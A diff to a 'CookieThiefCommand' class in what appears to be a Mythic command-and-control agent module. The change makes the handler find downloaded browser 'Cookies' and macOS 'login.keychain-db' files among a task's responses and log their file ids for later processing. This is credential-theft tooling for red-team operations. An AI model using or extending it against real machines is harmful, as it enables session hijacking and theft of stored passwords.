@@ -57,11 +57,20 @@ class CookieThiefCommand(CommandBase):
         pass
 
     async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
+        cookiesFileId = " "
+        keychainDBFileId = " "
         dlResponses = await MythicRPC().execute("get_responses", task_id=task.id)
         if dlResponses.status == "success":
             dlResponses = dlResponses.response
-            print(dlResponses["files"][0]["filename"])
-            print(dlResponses["files"][1]["filename"])
+            for responses in dlResponses["files"]:
+                if responses["filename"] == "Cookies":
+                    cookiesFileId = responses["agent_file_id"]
+            for responses in dlResponses["files"]:
+                if responses["filename"] == "login.keychain-db":
+                    keychainDBFileId = responses["agent_file_id"]
+            print("Cookies agent_file_id: " + cookiesFileId)
+            sys.stdout.flush()
+            print("Keychain agent_file_id: " + keychainDBFileId)
             sys.stdout.flush()
             return task
         else:
